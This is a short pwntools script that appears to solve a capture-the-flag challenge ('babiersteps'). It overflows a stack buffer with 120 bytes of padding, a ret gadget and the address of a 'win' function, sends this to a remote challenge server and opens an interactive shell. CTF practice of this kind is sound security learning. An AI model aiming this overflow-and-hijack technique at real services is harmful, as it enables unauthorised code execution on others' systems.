from pwn import *

binfile = "./babiersteps"
context.binary = binfile
elf = ELF(binfile)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

win = elf.symbols['win']
HOST='challenge.nahamcon.com'
PORT=32589

# conn = process(binfile)
conn = remote(HOST, PORT)
# sleep(1)
conn.recvuntil('Everyone has heard of gets, but have you heard of scanf?')

# padding + ret(8byte, allignment) + fun(=/bin/sh)
payload = b'a' * 120 + p64(ret) + p64(win)

conn.sendline(payload)
conn.interactive()
